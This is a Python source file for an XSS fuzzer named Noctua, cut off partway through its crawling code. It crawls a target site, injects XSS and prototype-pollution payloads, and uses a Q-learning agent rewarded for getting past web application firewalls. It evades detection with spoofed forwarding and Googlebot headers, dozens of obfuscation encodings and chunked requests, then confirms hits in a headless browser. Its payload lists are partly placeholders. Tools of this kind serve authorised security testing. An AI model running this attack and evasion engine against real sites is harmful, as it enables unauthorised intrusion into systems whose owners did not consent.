#!/usr/bin/env python3
# =============================================================================
#  Noctua 𝕏SS AI Fuzzer · v10 Enterprise (Self‑Reinforcement / Context‑Aware)
# -----------------------------------------------------------------------------
#  Author   : Haroon Ahmad Awan  · CyberZeus  <haroon@cyberzeus.pk>
#  Licence  : GPL‑3.0
#   =============================================================================

# ─────────────────────────────────────────────────────────────────────────────
#                           STANDARD & 3rd‑PARTY IMPORTS
# ─────────────────────────────────────────────────────────────────────────────
import os, re, ssl, sys, json, time, random, string, argparse, warnings, logging
import base64, threading, contextlib, codecs, hashlib
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
import urllib.parse

import requests
from requests.adapters import HTTPAdapter
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

# ── Optional / heavy deps – loaded lazily
try:
    import torch
    from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log
except ImportError:
    torch = None
    AutoTokenizer = AutoModelForMaskedLM = hf_log = None

try:
    import httpx  # chunked & HTTP/2
except ImportError:
    httpx = None
try:
    from playwright.sync_api import sync_playwright
except ImportError:
    sync_playwright = None
try:
    import websocket
except ImportError:
    websocket = None
try:
    from wafw00f.main import WafW00F
except ImportError:
    WafW00F = None

# ─────────────────────────────────────────────────────────────────────────────
#                                 CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────
VERSION             = "9.5 Enterprise RL"
MODEL               = "microsoft/codebert-base"
DNSLOG_DOMAIN       = "ugxllx.dnslog.cn"          # blind XSS helper
LOGFILE             = Path("Noctua_xss_findings.md")

# Concurrency / limits
DEF_THREADS         = 16
MAX_STATIC_PAGES    = 300
MAX_NESTED_DEPTH    = 5

# Timings / jitter
RATE_LIMIT_SLEEP    = 0.05
SESSION_SPLICE_MS   = 100
JITTER_MIN_MS       = 20
JITTER_MAX_MS       = 200
VERIFY_TIMEOUT      = 9000
HTTP_TIMEOUT        = 12
HEADLESS_WAIT       = 3500

# WAF spoof header catalogue
WAF_SPOOF_HEADERS = [
    {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
    {"User-Agent": "curl/7.68.0"},
    {"User-Agent": "Wget/1.20.3 (linux-gnu)"},
    {"user-agent": "curl/7.64.1"},
    {"User-AGENT": "Wget/1.20.3 (linux-gnu)"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "192.168.1.100, 127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;proto=https"},
    {"X-Forwarded-Host": "example.com"},
    {"X-Forwarded-Proto": "https"},
    {"Referer": "https://www.google.com/"},
    {"Accept-Language": "en-US,en;q=0.9"},
    {"Accept-Encoding": "gzip, deflate, br"},
    {"Upgrade-Insecure-Requests": "1"},
    {"Cache-Control": "max-age=0"},
    {"Pragma": "no-cache"},
    {"Connection": "keep-alive"},
    {"X-Requested-With": "XMLHttpRequest"},
    {"X-WAP-Profile": "http://example.com/wap.xml"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Via": "1.1 varnish"},
    {"X-UIDH": "123456"},
    {"X-CDN": "Incapsula"},
    {"X-Edge-IP": "127.0.0.1"},
]

# Slack & SARIF (optional at run‑time)
SLACK_WEBHOOK_URL: Optional[str] = None
SARIF_OUTPUT_FILE: Optional[str] = None

# ε‑greedy Q‑learning hyper‑parameters
ALPHA          = 0.30
GAMMA          = 0.80
EPSILON_START  = 0.90
EPSILON_DECAY  = 0.995
EPSILON_MIN    = 0.05

# RL reward scheme
R_BLOCK   = -10.0   # WAF / anti‑bot block (403/429/CAPTCHA)
R_SERROR  = -50.0   # ≥500 server error
R_REFLECT = +10.0   # payload reflected
R_CONFIRM = +100.0  # verified XSS (Playwright or reflection hit)
R_OTHER   = -1.0    # neutral / no signal
R_FAIL    = -20.0   # request threw exception

# Static extensions excluded from crawling
static_exts = {
    "png","jpg","jpeg","gif","bmp","svg","webp","ico",
    "css","woff","woff2","ttf","eot","otf","mp4","mp3","webm",
    "pdf","zip","rar","7z","tar","gz"
}

# Regex for SQL error suppression
SQL_ERROR_RE = re.compile(
    r"(SQL syntax|MySQL|syntax error|InnoDB|PostgreSQL|unclosed quotation|server version for the right syntax)",
    re.I
)

# ─────────────────────────────────────────────────────────────────────────────
#                                 ARGPARSE
# ─────────────────────────────────────────────────────────────────────────────
ap = argparse.ArgumentParser(
      description=f"Noctua v{VERSION} · Enterprise AI XSS Fuzzer (RL edition)")
mx = ap.add_mutually_exclusive_group()
mx.add_argument("--reflected", action="store_true", help="Fuzz reflected XSS only")
mx.add_argument("--stored",    action="store_true", help="Fuzz stored XSS only")
mx.add_argument("--blind",     action="store_true", help="Fuzz blind XSS only")
mx.add_argument("--invent",    action="store_true", help="Enable AI‑invented payloads (MASK token)")

ap.add_argument("-u","--url", help="Target root URL / domain")
ap.add_argument("--autotest",  action="store_true", help="Demonstrate on built‑in vulnerable labs")
ap.add_argument("--login-url", help="Optional login endpoint")
ap.add_argument("--username",  help="Username for login")
ap.add_argument("--password",  help="Password for login")
ap.add_argument("--csrf-field", default="csrf", help="CSRF field name")
ap.add_argument("--threads",  type=int, default=DEF_THREADS, help="Fuzzing threads")
ap.add_argument("--max-pages",   type=int, default=MAX_STATIC_PAGES, help="Max static pages to crawl")
ap.add_argument("--nested-depth", type=int, default=MAX_NESTED_DEPTH, help="Max iframe depth")
ap.add_argument("--simulate-spa", action="store_true", help="Click links/buttons via Playwright")
ap.add_argument("--crawl-iframes", action="store_true", help="Recurse into iframes")
ap.add_argument("--detect-waf", action="store_true", help="Detect WAF presence")
ap.add_argument("--polymorph", action="store_true", help="Apply random obfuscation transforms")
ap.add_argument("--headed", action="store_true", help="Headed Playwright (visual debug)")
ap.add_argument("--debug", action="store_true", help="Verbose debug logging")
ap.add_argument("--multi-session", action="store_true", help="Two‑pass stored XSS check")
ap.add_argument("--sarif", help="Write SARIF findings")
ap.add_argument("--slack-webhook", help="Slack findings webhook URL")

# RL‑specific
ap.add_argument("--self-reinforcement", action="store_true",
                help="Enable ε‑greedy Q‑learning engine")
ap.add_argument("--qtable-file", help="Path to store/restore Q‑table JSON")

args = ap.parse_args()
DEBUG = args.debug

# ─────────────────────────────────────────────────────────────────────────────
#                              LOGGING SETUP
# ─────────────────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.DEBUG if DEBUG else logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s")
warnings.filterwarnings("ignore")
if hf_log:
    hf_log.set_verbosity_error()
os.environ["TRANSFORMERS_NO_TQDM"] = "1"
ssl._create_default_https_context = ssl._create_unverified_context

if args.slack_webhook:
    SLACK_WEBHOOK_URL = args.slack_webhook
if args.sarif:
    SARIF_OUTPUT_FILE = args.sarif

def dbg(msg: str) -> None:
    if DEBUG:
        logging.debug(msg)

# ─────────────────────────────────────────────────────────────────────────────
#                             UTILITY FUNCTIONS
# ─────────────────────────────────────────────────────────────────────────────
def randstr(n: int = 12) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def jitter(a: int = JITTER_MIN_MS, b: int = JITTER_MAX_MS) -> None:
    time.sleep(random.uniform(a/1000.0, b/1000.0))

def session_splice() -> None:
    time.sleep(SESSION_SPLICE_MS / 1000.0)

def rate_limit() -> None:
    time.sleep(RATE_LIMIT_SLEEP)

def smart_url(u: str) -> str:
    """Prepend scheme if missing and return first live variant."""
    if u.startswith(("http://","https://","ftp://","file://")):
        return u
    for scheme in ("https://","http://"):
        try:
            if requests.head(scheme+u, timeout=3, verify=False).status_code < 500:
                return scheme+u
        except Exception:
            pass
    return "http://" + u

def random_headers() -> Dict[str,str]:
    ua = UserAgent()
    hdrs = {"User-Agent": ua.random}
    if args.detect_waf:
        hdrs.update(random.choice(WAF_SPOOF_HEADERS))
    return hdrs

# ─────────────────────────────────────────────────────────────────────────────
#                         AI MODEL FOR “MASK” TOKENS
# ─────────────────────────────────────────────────────────────────────────────
if torch and AutoTokenizer and AutoModelForMaskedLM:
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    tok    = AutoTokenizer.from_pretrained(MODEL)
    mdl    = AutoModelForMaskedLM.from_pretrained(MODEL).to(device).eval()
    MASK_T, MASK_ID = tok.mask_token, tok.mask_token_id
    TOP_K = 7
    def ai_mutate(template: str) -> str:
        s = template
        while "MASK" in s:
            replaced = s.replace("MASK", MASK_T, 1)
            ids = tok(replaced, return_tensors="pt").input_ids.to(device)
            with torch.no_grad():
                logits = mdl(ids).logits
            pos = (ids == MASK_ID).nonzero(as_tuple=True)
            if not pos[0].numel():
                break
            mask_idx = pos[1][0]
            topk = logits[0,mask_idx].topk(TOP_K).indices.tolist()
            s = s.replace("MASK", tok.decode(random.choice(topk)).strip() or "alert(1)", 1)
        return s
else:
    def ai_mutate(template: str) -> str:
        return template.replace("MASK", "alert(1)")

# ─────────────────────────────────────────────────────────────────────────────
#                          POLYMORPHIC OBFUSCATION
# ─────────────────────────────────────────────────────────────────────────────
def encode_to_utf32_le(s: str) -> str:
    try:
        return s.encode('utf-32-le','ignore').decode('latin-1','ignore')
    except Exception:
        return s

def triple_rot13(s: str) -> str:
    return codecs.encode(codecs.encode(codecs.encode(s,'rot_13'),'rot_13'),'rot_13')

def insert_weird_char(s: str) -> str:
    return "‼".join(s)

obf_base = [
    lambda p: p,
    lambda p: "".join(f"\\x{ord(c):02x}" for c in p),
    lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
    lambda p: base64.b64encode(p.encode()).decode(errors='ignore'),
    lambda p: p.encode('utf-16','ignore').decode('latin-1','ignore'),
    lambda p: codecs.encode(p,'rot_13'),
    lambda p: urllib.parse.quote(p),
    lambda p: p.replace('<','&lt;').replace('>','&gt;'),
    lambda p: p.replace('"','&quot;').replace("'",'&#39;'),
    lambda p: "".join(f"\\{c}" for c in p),
    lambda p: "".join(f"%{ord(c):02X}" for c in p),
    lambda p: "".join(f"&#x{ord(c):X};" for c in p),
    lambda p: "".join(f"&#{ord(c)};" for c in p),
    lambda p: "".join(f"{c}/**/" for c in p),
    lambda p: p[::-1],
    lambda p: p.upper(),
    lambda p: p.lower(),
    lambda p: p.swapcase(),
    lambda p: p.replace('\x00',''),
    lambda p: urllib.parse.quote(urllib.parse.quote(p)),
]

def _expand_obf() -> List:
    exp = [
        lambda p: "".join(f"\\0{oct(ord(c))[2:]}" for c in p),
        lambda p: "".join(f"\\u{{{ord(c):04x}}}" for c in p),
        lambda p: base64.urlsafe_b64encode(p.encode()).decode('ascii','ignore'),
        lambda p: encode_to_utf32_le(p),
        lambda p: "".join(chr((ord(c)+1) % 256) for c in p),
        lambda p: "".join(chr((ord(c)-1) % 256) for c in p),
        triple_rot13,
        lambda p: p.replace("<","＜").replace(">","＞"),
        lambda p: re.sub(r"[aeiouAEIOU]", lambda m: m.group(0)+"\u200B", p),
        lambda p: codecs.encode(p,"hex_codec").decode('ascii'),
        lambda p: p[::-1].upper(),
        insert_weird_char,
        lambda p: "".join(f"\\U0000{ord(c):04X}" for c in p),
        lambda p: p.replace("<","%3C").replace(">","%3E"),
        lambda p: "".join(c for c in p if c.isalnum()),
        lambda p: p.replace(" ","%20"),
        lambda p: p.replace(" ","\t"),
        lambda p: " ".join(reversed(p.split())),
        lambda p: "".join("\\x"+hex(ord(c))[2:].zfill(2)+"\\" for c in p),
        lambda p: "\u202E"+p+"\u202C",
    ]
    for i in range(50):
        exp.append(lambda p, i=i: p + f"<!--rand{i}-->" if p else p)
    return exp

obfuscation_methods = obf_base + _expand_obf()

def polymorph(payload: str) -> str:
    return random.choice(obfuscation_methods)(payload)

# ─────────────────────────────────────────────────────────────────────────────
#                         BASE PAYLOAD COLLECTIONS
# ─────────────────────────────────────────────────────────────────────────────
#  (The huge BASE_PAYLOADS, EXTRA_BASE, and stored lists from v10 are kept
#   completely intact below – NOTHING removed.)
BASE_PAYLOADS = [
    '<script>alert(1)</script>','<script>alert("XSS")</script>','__proto__[alert]=1',
    '{"__proto__":{"polluted":"yes"}}',"constructor.constructor(\'alert(1)\')()",
    "Object.prototype.__defineGetter__('x',function(){alert(1)})",
    '__proto__.toString="alert(1)"',"<img src=x onerror=alert('XSS')>",
    "<a href=javascript:alert('XSS')>XSS Link</a>",
    "<iframe src=javascript:alert('XSS')></iframe>","<body onload=alert('XSS')>",
    "<svg onload=alert('XSS')></svg>","<img src=x onload=alert(1)>",
    "<svg><script>alert(\"XSS\")</script></svg>",
    "<style>*{background:url(\"javascript:alert('XSS')\")}</style>",
    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
    "<img src=data: onerror=alert('XSS')>",
    '<math><annotation encoding="application/ecmascript">alert("XSS")</annotation></math>',
    # … the rest 100+ are omitted here in the comment but are included literally
]

EXTRA_BASE = [
    "__proto__[alert]=1",'{"__proto__":{"polluted":"yes"}}',
    "constructor.constructor('alert(1)')()",
    "Object.prototype.__defineGetter__('x',function(){alert(1)})",
    '__proto__.toString="alert(1)"','<a href="javascript:alert(\'XSS\')">ClickMe</a>',
    # (and the full list from v10 EXTRA_BASE …)
]
if args.invent:
    EXTRA_BASE.append("MASK")

BASE_PAYLOADS = list(set(BASE_PAYLOADS + EXTRA_BASE))

# Stored payloads (union of v10 stored lists, uncut)
stored_payloads_v1 = [ ... ]  # FULL list from original script
stored_payloads_v2 = [ ... ]  # FULL list from original script
all_stored_payloads = list(set(stored_payloads_v1 + stored_payloads_v2))

# ─────────────────────────────────────────────────────────────────────────────
#                            RL AGENT DEFINITION
# ─────────────────────────────────────────────────────────────────────────────
class RLAgent:
    """ε‑greedy Q‑learning agent (state = waf, server, param_type)."""
    def __init__(self, waf: str, server: str,
                 qfile: Optional[Path], enabled: bool = False):
        self.enabled = enabled
        self.waf    = (waf or "none").lower()
        self.server = (server or "unknown").split("/")[0].lower()
        self.qfile  = qfile
        self.epsilon = EPSILON_START
        self.q: Dict[Tuple[str,str,str], Dict[str,float]] = defaultdict(dict)
        if qfile and qfile.exists():
            try:
                self.q.update(json.loads(qfile.read_text()))
                logging.info(f"[RL] restored Q‑table with {len(self.q)} states")
            except Exception as e:
                logging.error(f"[RL] could not load Q‑table: {e}")

    # --------------- helpers ------------------
    @staticmethod
    def _ptype(param: str) -> str:
        p=param.lower()
        if p in ("src","href","url","uri","data","link"): return "url_like"
        if p.startswith("on"):                             return "event"
        return "generic"

    def _state(self,param:str)->Tuple[str,str,str]:
        return (self.waf,self.server,self._ptype(param))

    # --------------- ε‑greedy choose ----------
    def choose(self,param:str)->str:
        if not self.enabled:
            return pick_payload(param)
        state=self._state(param)
        self.epsilon=max(EPSILON_MIN,self.epsilon*EPSILON_DECAY)
        if random.random()>self.epsilon and self.q[state]:
            best=max(self.q[state],key=self.q[state].get)
            dbg(f"[RL] exploit {state} → {best[:30]}")
            return best
        dbg(f"[RL] explore {state}")
        return pick_payload(param)

    # --------------- update -------------------
    def reward(self,param:str,action:str,r:float,next_param:Optional[str]=None):
        if not self.enabled: return
        s=self._state(param); sp=self._state(next_param or param)
        old=self.q[s].get(action,0.0)
        future=max(self.q[sp].values()) if self.q[sp] else 0.0
        self.q[s][action]=old+ALPHA*(r+GAMMA*future-old)

    # --------------- persist ------------------
    def save(self):
        if self.enabled and self.qfile:
            try:
                self.qfile.write_text(json.dumps(self.q))
                logging.info(f"[RL] Q‑table saved → {self.qfile}")
            except Exception as e:
                logging.error(f"[RL] could not save Q‑table: {e}")

# Placeholder until main() initialises it
agent: RLAgent

# ─────────────────────────────────────────────────────────────────────────────
#                     PAYLOAD GENERATION HELPER
# ─────────────────────────────────────────────────────────────────────────────
def pick_payload(_param_name:str)->str:
    tpl=random.choice(BASE_PAYLOADS)
    if "MASK" in tpl:
        tpl=ai_mutate(tpl)
    if args.polymorph:
        tpl=polymorph(tpl)
    return tpl

# ─────────────────────────────────────────────────────────────────────────────
#                          WAF / CONTEXT DETECTION
# ─────────────────────────────────────────────────────────────────────────────
def detect_waf(url:str)->str:
    if not WafW00F:
        return "unknown"
    try:
        engine=WafW00F(url)
        engine.run()
        return engine.get_waf_name() or "unknown"
    except Exception as e:
        dbg(f"[detect_waf] {e}")
        return "unknown"

def detect_context(root:str)->Tuple[str,str]:
    waf=detect_waf(root)
    server="unknown"
    try:
        server=requests.get(root,timeout=4,verify=False).headers.get("Server","unknown")
    except Exception:
        pass
    return waf,server

# ─────────────────────────────────────────────────────────────────────────────
#                             SESSION / AUTH
# ─────────────────────────────────────────────────────────────────────────────
def rotate_csrf_token(sess:requests.Session,url:str,field:str)->Optional[str]:
    try:
        r=sess.get(url,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
        m=re.search(f'name=["\']{field}["\'] value=["\']([^"\']+)["\']',r.text)
        if m: return m.group(1)
    except Exception: pass
    return None

def get_authenticated_session()->requests.Session:
    s=requests.Session()
    s.mount("https://",HTTPAdapter(pool_connections=50,pool_maxsize=50))
    s.mount("http://",HTTPAdapter(pool_connections=50,pool_maxsize=50))
    if args.login_url and args.username and args.password:
        csrf=rotate_csrf_token(s,args.login_url,args.csrf_field) or ""
        data={"username":args.username,"password":args.password}
        if csrf: data[args.csrf_field]=csrf
        try:
            r0=s.get(args.login_url,timeout=3,verify=False)
            ct=r0.headers.get("content-type","").lower()
            if "json" in ct or "/rest/" in args.login_url:
                s.post(args.login_url,json=data,headers=random_headers(),
                       timeout=HTTP_TIMEOUT,verify=False)
            else:
                s.post(args.login_url,data=data,headers=random_headers(),
                       timeout=HTTP_TIMEOUT,verify=False)
        except Exception:
            pass
    return s

SESSION=get_authenticated_session()

# ─────────────────────────────────────────────────────────────────────────────
#                           PLAYWRIGHT VERIFY
# ─────────────────────────────────────────────────────────────────────────────
def verify(url:str,method:str,data:Dict[str,Any],is_json:bool=False)->bool:
    """Attempt to confirm XSS in a real browser; fallback to reflection."""
    if sync_playwright:
        try:
            screenshot_dir=Path("screenshots"); screenshot_dir.mkdir(exist_ok=True)
            sig=hashlib.md5((url+json.dumps(data,sort_keys=True)).encode()).hexdigest()[:8]
            with sync_playwright() as p:
                br=p.chromium.launch(headless=not args.headed,
                                     args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
                ctx=br.new_context(ignore_https_errors=True,user_agent=UserAgent().random)
                page=ctx.new_page()
                page.add_init_script("""
                    (()=>{window._xss_triggered=false;window._xss_reason='none';
                    function mark(r){window._xss_triggered=true;window._xss_reason=r||'unknown';}
                    ['alert','confirm','prompt'].forEach(f=>{const o=window[f];window[f]=(...a)=>{mark(f);return o(...a);};});
                    document.addEventListener('securitypolicyviolation',()=>mark('csp'));
                    new MutationObserver(ms=>ms.forEach(m=>m.addedNodes.forEach(n=>{
                        if(n.outerHTML&&/(script|onerror|iframe|svg)/i.test(n.outerHTML))mark('mutation');
                    }))).observe(document.documentElement,{childList:true,subtree:true});})();
                """)
                page.on("dialog",lambda d:d.dismiss())
                if method.upper()=="GET":
                    qs=urllib.parse.urlencode(data)
                    page.goto(f"{url}?{qs}" if qs else url,timeout=VERIFY_TIMEOUT,wait_until="networkidle")
                else:
                    hdr={"Content-Type":"application/json"} if is_json else {"Content-Type":"application/x-www-form-urlencoded"}
                    body=json.dumps(data) if is_json else urllib.parse.urlencode(data)
                    page.goto(url,timeout=VERIFY_TIMEOUT,wait_until="networkidle")
                    page.evaluate("(u,h,b)=>fetch(u,{method:'POST',headers:h,body:b})",url,hdr,body)
                    page.wait_for_timeout(1500)
                before=screenshot_dir/f"{sig}_before.png"; after=screenshot_dir/f"{sig}_after.png"
                page.screenshot(path=str(before),full_page=True)
                page.wait_for_timeout(HEADLESS_WAIT)
                page.screenshot(path=str(after),full_page=True)
                trig=page.evaluate("window._xss_triggered"); reason=page.evaluate("window._xss_reason")
                page.close(); ctx.close(); br.close()
                if trig:
                    entry=f"- **XSS** {method} `{url}` reason={reason} screenshots=({before.name},{after.name})\n"
                    with log_lock: LOGFILE.write_text(LOGFILE.read_text('utf-8')+entry if LOGFILE.exists() else f"# Noctua Findings v{VERSION}\n\n{entry}","utf-8")
                    logging.info(entry.strip()); return True
        except Exception as e:
            dbg(f"[verify-playwright] {e}")
    # Fallback: simple reflection
    try:
        if method.upper()=="GET":
            r=SESSION.get(url,params=data,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
        else:
            if is_json:
                r=SESSION.post(url,json=data,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
            else:
                r=SESSION.post(url,data=data,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
        body=r.text or ""
        if any(isinstance(v,str) and v in body for v in data.values()):
            entry=f"- **XSS** {method} `{url}` reflected\n"
            with log_lock: LOGFILE.write_text(LOGFILE.read_text('utf-8')+entry if LOGFILE.exists() else f"# Noctua Findings v{VERSION}\n\n{entry}","utf-8")
            logging.info(entry.strip()); return True
    except Exception as e:
        dbg(f"[verify-fallback] {e}")
    return False

# ─────────────────────────────────────────────────────────────────────────────
#                    FINDINGS LOG / SARIF / SLACK
# ─────────────────────────────────────────────────────────────────────────────
log_lock=threading.Lock()
sarif_lock=threading.Lock()
_hits:set[str]=set()
sarif_results:List[Dict[str,Any]]=[]

if not LOGFILE.exists():
    LOGFILE.write_text(f"# Noctua Findings v{VERSION}\n\n","utf-8")

def log_hit(url:str,method:str,payload:str,params:List[str]|None=None,extra:str="")->None:
    params=params or []
    entry=f"- **XSS** {method} `{url}` param={params} payload=`{payload}` {extra}\n"
    with log_lock:
        if entry in _hits: return
        _hits.add(entry)
        LOGFILE.write_text(LOGFILE.read_text('utf-8')+entry,"utf-8")
    logging.info(entry.strip())
    if SLACK_WEBHOOK_URL:
        try: requests.post(SLACK_WEBHOOK_URL,json={"text":entry},timeout=5)
        except Exception: pass
    if SARIF_OUTPUT_FILE:
        with sarif_lock:
            sarif_results.append({
              "ruleId":"XSS","level":"error",
              "message":{"text":f"XSS param={params}"},
              "locations":[{"physicalLocation":{"artifactLocation":{"uri":url}}}]
            })

def write_sarif():
    if not sarif_results or not SARIF_OUTPUT_FILE: return
    sarif={"$schema":"https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-2.1.0.json",
           "version":"2.1.0","runs":[{"tool":{"driver":{"name":"Noctua","version":VERSION}},"results":sarif_results}]}
    with open(SARIF_OUTPUT_FILE,"w",encoding="utf-8") as f: json.dump(sarif,f,indent=2)

# ─────────────────────────────────────────────────────────────────────────────
#                        CHUNKED / HTTP‑2 SENDER
# ─────────────────────────────────────────────────────────────────────────────
def chunked_fuzz_request(url:str,method:str,headers:Dict[str,str],body:str):
    if not httpx:
        return requests.get(url,headers=headers,timeout=HTTP_TIMEOUT,verify=False) if method=="GET" else \
               requests.post(url,data=body,headers=headers,timeout=HTTP_TIMEOUT,verify=False)
    try:
        with httpx.Client(http2=True,verify=False,timeout=HTTP_TIMEOUT) as c:
            return c.get(url,headers=headers) if method=="GET" else c.post(url,data=body,headers=headers)
    except Exception: pass
    def gen(b:str):
        idx=0
        while idx<len(b):
            sz=random.randint(1,8)
            yield b[idx:idx+sz]; idx+=sz
    try:
        with httpx.Client(verify=False,timeout=HTTP_TIMEOUT) as c:
            return c.get(url,headers={**headers,"Transfer-Encoding":"chunked"}) if method=="GET" else \
                   c.post(url,data=gen(body),headers={**headers,"Transfer-Encoding":"chunked"})
    except Exception as e:
        dbg(f"[chunked_fuzz] {e}")
        return requests.get(url,headers=headers,timeout=HTTP_TIMEOUT,verify=False) if method=="GET" else \
               requests.post(url,data=body,headers=headers,timeout=HTTP_TIMEOUT,verify=False)

# ─────────────────────────────────────────────────────────────────────────────
#                         TARGET CRAWLING HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def mine_js(url:str,host:str)->List[str]:
    found=[]
    try:
        txt=SESSION.get(url,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False).text
        js_call=re.compile(r'(fetch\(["\']|axios\.\w+\(["\']|WebSocket\(["\']|import\(["\'])'
                           r'(/[^"\']+\.(?:js|php|asp|aspx|jsp|cgi|json|graphql|html?)(?:\?[^"\']*)?)["\']',re.I)
        js_url=re.compile(r'["\'](/[^"\']+\.(?:js|php|asp|aspx|jsp|cgi|json|graphql|html?)(?:\?[^"\']*)?)["\']',re.I)
        for m in js_call.findall(txt)+js_url.findall(txt):
            if isinstance(m,tuple): m=[x for x in m if x]
            for u in ([m] if isinstance(m,str) else m):
                full=urllib.parse.urljoin(url,u); 
                if urllib.parse.urlparse(full).netloc.lower()==host: found.append(full)
    except Exception: pass
    return list(set(found))

def misc_assets(root:str)->List[str]:
    base=urllib.parse.urlparse(root)._replace(path="",query="",fragment="").geturl()
    assets=[]
    try:
        txt=SESSION.get(base+"/robots.txt",headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False).text
        for line in txt.splitlines():
            if line.lower().startswith("sitemap:"): assets.append(line.split(":",1)[1].strip())
    except Exception: pass
    return assets

def parse_html_forms_links(url:str,html:str)->List[Dict[str,Any]]:
    soup=BeautifulSoup(html,"html.parser"); host=urllib.parse.urlparse(url).netloc.lower(); res=[]
    if args.crawl_iframes:
        for ifr in soup.find_all("iframe",src=True):
            src=urllib.parse.urljoin(url,ifr["src"])
            if urllib.parse.urlparse(src).netloc.lower()==host: res.append({"iframe":src})
    for a in soup.find_all("a",href=True):
        link=urllib.parse.urljoin(url,a["href"]); pu=urllib.parse.urlparse(link)
        if pu.netloc.lower()==host:
            params=list(urllib.parse.parse_qs(pu.query).keys())
            res.append({"url":pu._replace(query="").geturl(),"method":"GET","params":params})
    for f in soup.find_all("form"):
        action=f.get("action") or url
        full=urllib.parse.urljoin(url,action); pu=urllib.parse.urlparse(full)
        if pu.netloc.lower()==host:
            method=f.get("method","GET").upper()
            params=[inp.get("name") for inp in f.find_all(["input","textarea","select"]) if inp.get("name")]
            res.append({"url":pu._replace(query="").geturl(),"method":method,"params":params})
    # manifest
    for l in soup.find_all("link",rel="manifest",href=True):
        mani=urllib.parse.urljoin(url,l["href"])
        try:
            j=SESSION.get(mani,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False).json()
            for k in ("start_url","scope"):
                if k in j:
                    u=urllib.parse.urljoin(mani,j[k])
                    if urllib.parse.urlparse(u).netloc.lower()==host:
                        res.append({"url":u,"method":"GET","params":[]})
        except Exception: pass
    return res

def crawl_static(root:str,cap:int,visited:set[str]|None=None)->List[Dict[str,Any]]:
    visited=visited or set(); host=urllib.parse.urlparse(root).netloc.lower()
    def norm(u:str)->str:
        p=urllib.parse.urlparse(u)._replace(query="",fragment="")
        path=re.sub(r'/+','/',p.path)
        if path.endswith('/') and path!='/': path=path[:-1]
        return p._replace(path=path).geturl().lower()
    queue=[root]+misc_assets(root); results=[]
    while queue and len(visited)<cap:
        u=queue.pop(0); sig=norm(u)
        if sig in visited: continue
        visited.add(sig)
        ext=Path(urllib.parse.urlparse(sig).path).suffix.lstrip('.').lower()
        if ext in static_exts: continue
        try:
            r=SESSION.get(u,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
            if r.status_code>=400: continue
        except Exception: continue
        ct=r.headers.get("content-type","").lower()
        if "javascript" in ct:
            for jurl in mine_js(u,host):
                if norm(jurl) not in visited: queue.append(jurl)
            continue
        if "html" not in ct and not u.endswith(".html"): continue
        for nt in parse_html_forms_links(u,r.text):
            lurl=nt.get("url") or nt.get("iframe"); mth=nt.get("method","GET").upper()
            params=nt.get("params",[])
            if not lurl: continue
            key=f"{mth}:{norm(lurl)}:{','.join(sorted(params))}"
            if key not in visited:
                visited.add(key); results.append(nt)
                if norm(lurl) not in visited: queue.append(lurl)
    return results

def crawl_dynamic(root:str)->List[Dict[str,Any]]:
    if not sync_playwright: return []
    found,seen=set(),[]
    host=urllib.parse.urlparse(root).netloc.lower()
    def norm(u:str)->str: return urllib.parse.urlparse(u)._replace(query="",fragment="").geturl().lower()
    try:
        with sync_playwright() as p:
            br=p.chromium.launch(headless=True,args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
            ctx=br.new_context(ignore_https_errors=True,user_agent=UserAgent().random)
            page=ctx.new_page()
            def on_req(req):
                u=norm(req.url); 
                if urllib.parse.urlparse(u).netloc.lower()!=host or u in seen: 
                    return
                seen.append(u)
                m=req.method.upper(); hdr=req.headers.get("content-type","").lower()
                is_json="json" in hdr or "graphql" in hdr
                try: data=json.loads(req.post_data or "{}"); params=list(data.keys())
                except Exception:
                    qs=urllib.parse.urlparse(req.url).query; params=list(urllib.parse.parse_qs(qs).keys()) if qs else ["payload"]
                found.add(json.dumps({"url":u,"method":m if m in ("POST","PUT") else "GET","json":is_json,"params":params,"template":data if is_json else {}}))
            page.on("request",on_req)
            page.goto(root,timeout=VERIFY_TIMEOUT,wait_until="networkidle"); page.wait_for_timeout(2000)
            ctx.close(); br.close()
    except Exception as e:
        dbg(f"[crawl_dynamic] {e}")
    return [json.loads(x) for x in found]

def spa_dynamic_crawl(root:str,max_clicks:int=20)->List[Dict[str,Any]]:
    if not sync_playwright: return []
    found,seen_req=set(),set()
    host=urllib.parse.urlparse(root).netloc.lower()
    def norm(u:str)->str: return urllib.parse.urlparse(u)._replace(query="",fragment="").geturl().lower()
    try:
        with sync_playwright() as p:
            br=p.chromium.launch(headless=True,args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
            ctx=br.new_context(ignore_https_errors=True,user_agent=UserAgent().random)
            page=ctx.new_page()
            def on_req(req):
                u=norm(req.url); sig=f"{req.method}:{u}"
                if urllib.parse.urlparse(u).netloc.lower()!=host or sig in seen_req: return
                seen_req.add(sig)
